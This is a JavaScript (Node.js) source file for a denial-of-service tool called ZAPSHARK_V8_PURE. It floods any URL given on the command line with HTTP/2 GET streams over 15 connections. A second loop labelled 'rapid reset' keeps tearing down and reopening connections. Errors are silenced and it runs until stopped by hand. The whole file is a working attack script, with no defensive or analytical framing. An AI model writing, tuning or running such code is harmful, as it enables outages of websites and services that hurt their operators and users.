const http2 = require('http2');

class ZAPSHARK_V8_PURE {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.startTime = Date.now();
        this.clients = [];
        this.activeStreams = 0;
        
        // MAX POWER
        this.clientCount = 15;
        this.maxStreamsPerClient = 1002;
        
        // ATTACK LOOPS
        this.attackLoop = null;
        this.resetLoop = null;
    }

    createClient() {
        try {
            return http2.connect(this.targetUrl);
        } catch {
            return null;
        }
    }

    start() {
        // CREATE 15 CONNECTIONS
        for (let i = 0; i < this.clientCount; i++) {
            const client = this.createClient();
            if (client) {
                client.on('error', () => {});
                this.clients.push(client);
            }
        }

        // EXTREME ATTACK LOOP
        this.attackLoop = setInterval(() => {
            if (this.clients.length === 0) return;

            const availableStreams = (this.maxStreamsPerClient * this.clients.length) - this.activeStreams;
            const streamsThisTick = Math.min(availableStreams, 300);

            for (let i = 0; i < streamsThisTick; i++) {
                const client = this.clients[Math.floor(Math.random() * this.clients.length)];
                if (!client) continue;

                try {
                    this.activeStreams++;
                    
                    const req = client.request({ ':method': 'GET', ':path': '/' });
                    
                    req.on('close', () => {
                        this.activeStreams--;
                        this.totalRequests++;
                    });
                    
                    req.end();
                    
                } catch {
                    this.activeStreams--;
                    this.totalRequests++;
                }
            }
            
            // UPDATE DISPLAY
            process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
        }, 0.1);

        // RAPID RESET LOOP
        this.resetLoop = setInterval(() => {
            if (this.clients.length > 0) {
                const index = Math.floor(Math.random() * this.clients.length);
                try {
                    this.clients[index].destroy();
                    const newClient = this.createClient();
                    if (newClient) {
                        newClient.on('error', () => {});
                        this.clients[index] = newClient;
                    }
                } catch {}
            }
        }, 0.5);
    }
}

// START
const target = process.argv[2];
if (!target) process.exit(1);

const shark = new ZAPSHARK_V8_PURE(target);
shark.start();

// NO AUTO-STOP, MANUAL CLOSE ONLY
process.on('SIGINT', () => process.exit(0));
